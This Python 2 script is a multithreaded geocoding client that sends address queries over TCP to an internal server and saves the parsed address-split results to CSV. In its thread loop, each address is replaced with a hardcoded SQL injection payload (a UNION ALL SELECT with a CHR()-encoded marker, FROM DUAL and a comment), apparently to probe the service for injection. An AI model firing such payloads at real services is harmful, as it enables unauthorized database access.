#coding:utf-8
import sys
import os
import socket
import struct
import time
import threading
from Queue import Queue
import xml.etree.cElementTree as ET
from lxml import etree

def xml2Text(obj):
    return obj.text + str(obj.attrib)

def getInfoFromXML(input):
    try:
         #tree = ET.fromstring(input.decode('gbk').encode('utf8').replace('GBK', 'utf-8'))
        parser = etree.XMLParser(recover=True)
        tree = etree.fromstring(input.decode('gbk').encode('utf8').replace('GBK', 'utf-8'), parser=parser)
        if tree.find("addrSplitInfo") == None:
            return ("", 0, 0, 0, 0, "", 0, 0)
        else:
            listResult = tree.find("addrSplitInfo")
            if listResult != None:
                #print "@@@@@ : ", listResult[0].find('as_info').text
                split_info = ""
                max_level = 0
                for as_info in listResult.iter('as_info'):
                    tmp = xml2Text(as_info)
                    m = int(as_info.get("match"))
                    l = int(as_info.get("level"))
                    split_info += as_info.text + "^" + as_info.get("level") + "^" + as_info.get("prop") + "^" + as_info.get("match") + "|"
                    if m == 1:
                        max_level = max(l, max_level)
                        
                split_info = split_info[:-1]

                return ("", 0, 0, 0, 0, split_info, str(max_level), 0)
            else:
                return ("", 0, 0, 0, 0, "", 0, 0)
    except Exception as e:
        print e
        return ("", 0, 0, 0, 0, "", 0, 0)

# 初始化socket连接
def initscok(host,port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host,port))
        linger_strcut=struct.pack('ii', 1, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger_strcut)
        return sock
    except socket.error:
        print socket.error
        pass
# 初始化地理编码请求串
def genquery(keyword):
    global  output_filename, adcode
    query='ret_splitinfo:1\nadcode:%s\nfilter_uprecision:2\nquery_type:GEOCODE\naddress:%s\n' % (adcode, keyword)
    return query
# 发送地理编码请求，处理其他业务逻辑
def connect(query, keyword, id, sock):
    try:
        head = 0xffffeeee
        cmdtype = 0
        length = len(query)+4
        q = struct.pack('III%ds' % len(query), head, length, cmdtype, query)
        sock.send(q)
        sock.recv(4)
        length, = struct.unpack('I', sock.recv(4))
        result = ''
        remain = length
        while remain:
            t = sock.recv(remain)
            result += t
            remain -= len(t)
        global  queryResults, mutex, count, output_filename,output_costime

        # 解析地理编码结果
        (name, sflag, x, y, level, addrSplitInfo, maxLevel, score) = getInfoFromXML(result)
        
        if addrSplitInfo.strip() == "":
            return result
        
        # 输出结果
        queryResult = id.decode("gbk").encode("utf8") + "," + keyword.decode("gbk").encode("utf8") + "," + addrSplitInfo.encode("utf8") + "\n"

        # output
        if mutex.acquire(1):
            try:
                t1 = time.time()
                queryResults += queryResult
                count += 1
                if count % 1 == 0:
                    fw = open(output_filename, "a+")
                    fw.write(queryResults)
                    fw.close()
                    queryResults = ""
                    print count
                t2 = time.time()
                output_costime += t2 - t1
            except Exception as e:
                print e
                pass
            mutex.release()
        return result
    except socket.error:
        print socket.error

# 多线程类
q = Queue()
class Cpreprocessor(threading.Thread):
    def __init__(self, lines, ip, port):
        threading.Thread.__init__(self)
        self.lines = lines
        self.sock = initscok(ip, port)
        self.sts = 0
        self.cts = 0
    def run(self):
        global q
        global index_id, index_address, index_split
    
        for line in self.lines:
            # print line
            try:
                line.strip()
                line = line.strip('\r\n').decode('utf8').encode('gbk')
                terms = line.split(',')
                if len(terms) >= index_address:
                    if terms[index_address] == "norm_address" or terms[index_address] == "address":
                        continue
                    keyword = terms[index_address]
                    keyword = "广东省&#39;) UNION ALL SELECT 31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,CHR(113)||CHR(98)||CHR(106)||CHR(98)||CHR(113)||CHR(89)||CHR(111)||CHR(113)||CHR(120)||CHR(106)||CHR(87)||CHR(90)||CHR(86)||CHR(81)||CHR(112)||CHR(108)||CHR(103)||CHR(85)||CHR(114)||CHR(85)||CHR(82)||CHR(113)||CHR(98)||CHR(75)||CHR(98)||CHR(122)||CHR(90)||CHR(100)||CHR(114)||CHR(76)||CHR(118)||CHR(77)||CHR(70)||CHR(75)||CHR(108)||CHR(98)||CHR(106)||CHR(108)||CHR(103)||CHR(82)||CHR(113)||CHR(112)||CHR(114)||CHR(86)||CHR(112)||CHR(113)||CHR(122)||CHR(112)||CHR(122)||CHR(113),31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31 FROM DUAL-- mfte广州市番禺区西三村新兴二巷15号三.四层"
                    connect(genquery(keyword), keyword, terms[index_id], self.sock)
            except Exception as e:
                print e
                pass
    

# 线程锁
mutex = threading.Lock()
# 待写入文件的内容
queryResults = ""
# 待写入文件的行数
count = 0
# 输出文件耗时
output_costime = 0
# 输出文件名
output_filename = "output.csv"
# 输出路径
output_path = ""

adcode = 0

index_id = 0
index_address = 1
index_split = 2

def get_field_index(fields, field_name):
    for i in range(0, len(fields)):
        field = fields[i]
        if field.lower() == field_name.lower():
            return i
    return -1

def getResultIndex(terms): 
    global index_id, index_address, index_split
    
    ret = get_field_index(terms, "id")
    if ret != -1:
        index_id = ret
        
    ret = get_field_index(terms, "address")
    if ret != -1:
        index_address = ret
    else:
        ret = get_field_index(terms, "norm_address")
        if ret != -1:
            index_address = ret
        
    ret = get_field_index(terms, "split_terms")
    if ret != -1:
        index_split = ret
    else:
        ret = get_field_index(terms, "splitInfo")
        if ret != -1:
            index_split = ret

def main():

    global  output_filename, adcode

    thread_no = 1
    ip = "10.202.43.233"
    port = 20180
    adcode = 440100

    input_filename = "e:/项目/地理编码/数据/tcp/shenzhen.csv"
    output_filename = "e:/project/Interface_api-master/report/shenzhen-out.csv"

    ## process
    f = open(input_filename)
    lines = f.read().splitlines()
    # 验证字段是否合法
    terms = lines[0].strip("\r\n").split(',')
    
    global index_id, index_address, index_split
    
    getResultIndex(terms)
        
    # 写表头   
    fw = open(output_filename,"w")
    header = ",".join(terms) + "\n"
    header = "id,address,split_terms\n"
    fw.write(header)
    fw.close()
    
    total_count = len(lines)
    threads = []
    ll = total_count/thread_no
    t1 = time.time()
    for i in range(thread_no):
        Opreprocessor = Cpreprocessor(lines[ll*i:ll*(i+1)], ip, port)
        Opreprocessor.start()
        threads.append(Opreprocessor)
            
    Opreprocessor = Cpreprocessor(lines[ll*thread_no:], ip, port)
    Opreprocessor.start()
    threads.append(Opreprocessor)
        
    for t in threads:
        t.join()

    ## output
    with open(output_filename, "a+") as fp_w:
        fp_w.write(queryResults)
        
    t2 = time.time()
    print 'process used %ds./n' % (t2-t1)
    print 'write file used %ds./n' % output_costime
    fp_w.close()

if __name__ == "__main__":
    main()